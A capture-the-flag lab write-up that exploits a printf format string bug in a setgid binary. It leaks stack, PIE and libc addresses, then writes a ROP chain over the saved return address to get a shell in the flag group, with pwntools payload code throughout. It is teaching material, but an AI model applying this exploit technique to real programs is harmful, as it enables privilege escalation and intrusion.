# Format String to Shell

The vulnerability:

```c
printf(buf);
```

where `buf` is fully controlled by the user.

The solve:

1. Format string reads to leak stack, PIE, and libc addresses.
2. `%n` writes to modify the saved return address.
3. A ROP chain written on the stack to call `setregid` and `execv("/bin/sh")`.

The solve does not use:

- Buffer overflow.
- GOT overwrite.
- Injected shellcode.

The relevant primitive is:

- Format string read: `%p`, `%lx`, etc.
- Format string write: `%n`, `%hn`, `%hhn`.

The full session is available as:

```
asciinema play record.cast
```

## Running the lab

Build the docker image:

```
./build.sh
```

Start a container:

```
./run.sh
```

`run.sh` builds the image if it is missing and drops you into a shell at `/lab` as user `ctf`. The image name defaults to `fmtlab`.

Inside the container:

- `vuln` is the target binary, installed setgid `flag`.
- `/flag` is readable only by the `flag` group.
- pwntools, gdb with pwndbg, tmux, and neovim are installed.

Exploiting `vuln` yields a shell in the `flag` group, which can read `/flag`.

## Target

`src/vuln.c`:

```c
int vuln(void)
{
    char buf[0x1000];

    ssize_t n = read(0, buf, sizeof buf - 1);
    if (n <= 0)
        return 0;

    buf[n] = '\0';

    printf(buf);

    return 1;
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    while (vuln()) { }

    return 0;
}
```

`printf` expects a format string, but no additional arguments are provided. The attacker controls the format string and can read stack values and perform arbitrary writes using `%n`.

Two details affect the solve:

### Multiple `printf` calls

`vuln()` returns `1` after processing non-empty input, causing `main()` to call it again.

This allows:

1. First input: leak addresses.
2. Second input: perform writes.

### Stack buffer location

The input buffer is `0x1000` bytes and is located directly below the saved frame data.

The saved return address is reachable with the format string primitive without modifying the canary.

## Mitigations

`checksec`:

```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
```

Relevant effects:

- Full RELRO prevents GOT overwrites because the GOT is read-only after initialization.
- NX prevents execution of injected code on the stack.
- PIE randomizes the binary base address.
- Stack canary protects against sequential stack overwrites.

The solve does not bypass the canary. The format string write targets specific addresses directly and does not overwrite the memory between the buffer and the return address.

## exploitation plan

The available format string targets are limited:

- GOT overwrite: not possible due to Full RELRO.
- Stack shellcode: not possible due to NX.
- Linear stack overwrite: blocked by the canary.

The remaining writable control-flow target is the saved return address.

The steps are:

1. Leak stack, PIE, and libc addresses.
2. Calculate the saved return address location.
3. Write a ROP chain using `%n`.
4. Return from `vuln()` into the chain.

The ROP chain performs:

1. `setregid(1337, 1337)`
2. `execv("/bin/sh", NULL)`

The first call preserves the `flag` group when launching the shell.

## Stack layout

The stack layout is obtained from the disassembly of `vuln`.

Relevant instructions:

```asm
116d  sub    rsp, 0x1020
1174  mov    rax, QWORD PTR fs:0x28
117d  mov    QWORD PTR [rbp-0x8], rax
1183  lea    rax, [rbp-0x1010]
1197  call   read@plt

11c8  lea    rax, [rbp-0x1010]
11d7  call   printf@plt
```

The stack frame:

```
rbp-0x1010  buffer
...
rbp-0x0008  stack canary
rbp+0x0000  saved rbp
rbp+0x0008  saved return address
```

The format string is stored at `rbp-0x1010`.

On amd64, `printf` receives the format string in `rdi`. Since no variadic arguments are provided, additional arguments are read from the stack.

The first stack argument is located at format string slot 6.

For this binary, the buffer starts at slot 8.

Therefore:

```
slot = 8 + (address - buffer_address) / 8
```

The important stack entries are:

| Entry                | Offset from buffer | Format slot | Value                 |
| -------------------- | -----------------: | ----------: | --------------------- |
| Stack canary         |           `0x1008` |         521 | Canary value          |
| Saved rbp            |           `0x1010` |         522 | Stack address         |
| Saved return address |           `0x1018` |         523 | Address inside `main` |
| libc return address  |           `0x1028` |         525 | Address inside libc   |

The canary is leaked only for completeness. It is not modified.

The required leaks are:

- Slot 522: stack address.
- Slot 523: PIE address.
- Slot 525: libc address.

breakpoint placed at

```
vuln+110
```

which corresponds to the `printf` call.

At this point the stack still contains the values used for the leaks.

## Step 1: Leak addresses

The first payload:

```python
payload = b"%522$p\n%523$p\n%525$p"
```

The addresses are converted into bases:

```python
stack_leak = int(p.recvline(), 16)

bin_leak = int(p.recvline(), 16)
binary.address = bin_leak - main_offset

libc_leak = int(p.recvline(), 16)
libc.address = libc_leak - libc_offset
```

The offsets are taken from the return addresses stored on the stack.

Example:

```
main+70
__libc_start_call_main+122
```

The stack contains:

```
saved return address -> main+70
libc return address  -> __libc_start_call_main+122
```

Subtracting these offsets gives:

```
PIE base
libc base
```

After this step the script knows:

- A writable stack address.
- The binary base.
- The libc base.

## Step 2: Calculate the write target

The leaked value is the saved `rbp` of `main`.

The relationship between the frames:

```
main stack frame

main_rbp - 0x08   return address to vuln
main_rbp - 0x10   saved rbp of vuln

vuln_rbp = main_rbp - 0x10
```

The leaked value:

```
slot 522 = main_rbp
```

The return address that `vuln` will use is:

```python
return_address = stack_leak - 0x8
```

This is the location where the ROP chain starts.

## Why the canary is not triggered

A normal stack overflow would need to overwrite:

```
buffer
canary
saved rbp
return address
```

The canary would detect the modification.

The format string primitive works differently:

```
arbitrary address -> arbitrary value
```

The exploit writes directly to:

```
saved return address
```

and never modifies:

```
rbp-0x8
```

Therefore the canary check succeeds.

## Step 3: ROP chain

The chain requires:

1. Set the group ID to keep the `flag` group.
2. Execute `/bin/sh`.

Required calls:

```c
setregid(1337, 1337);
execv("/bin/sh", NULL);
```

The required gadgets are obtained from libc:

```python
pop_rdi = libc.address + offset
pop_rsi = libc.address + offset
```

The chain:

```
pop rdi
1337
pop rsi
1337
setregid

pop rdi
address("/bin/sh")
pop rsi
0
execv
```

The write locations:

```python
writes = {
    rsp + 0x00: pop_rdi,
    rsp + 0x08: 1337,
    rsp + 0x10: pop_rsi,
    rsp + 0x18: 1337,
    rsp + 0x20: setregid,

    rsp + 0x28: pop_rdi,
    rsp + 0x30: binsh,
    rsp + 0x38: pop_rsi,
    rsp + 0x40: 0,
    rsp + 0x48: execv,

    rsp + 0x50: b"/bin/sh\x00"
}
```

The payload is generated with:

```python
fmtstr_payload(
    offset=8,
    writes=writes,
    write_size="byte"
)
```

`write_size="byte"` uses `%hhn` writes.

Advantages:

- Smaller individual writes.
- Lower required character count.
- Fits inside the input buffer.

## Stack execution flow

After the format string write completes:

```
vuln()
 |
 | leave
 | ret
 v

pop rdi
1337
pop rsi
1337
setregid()

pop rdi
"/bin/sh"
pop rsi
NULL
execv()
```

The existing stack layout already matches the ROP chain layout. No stack pivot is required.

## Privilege handling

The binary is installed with the `setgid` bit:

```
-rwxr-sr-x 1 ctf flag vuln
```

The process starts with:

```
uid=ctf
gid=ctf
egid=flag
```

Launching a shell directly can cause the shell to drop the effective group because the real and effective groups differ.

The exploit first calls:

```c
setregid(1337,1337)
```

After this:

```
gid=flag
egid=flag
```

The spawned shell keeps the required group permissions.

## Result

After the second payload:

```text
$ id
uid=1000(ctf) gid=1337(flag)

$ cat /flag
flag{...}
```

The exploit achieves code execution by:

- leaking addresses through the format string.
- writing a ROP chain to the saved return address skipping canary
- returning into the chain.
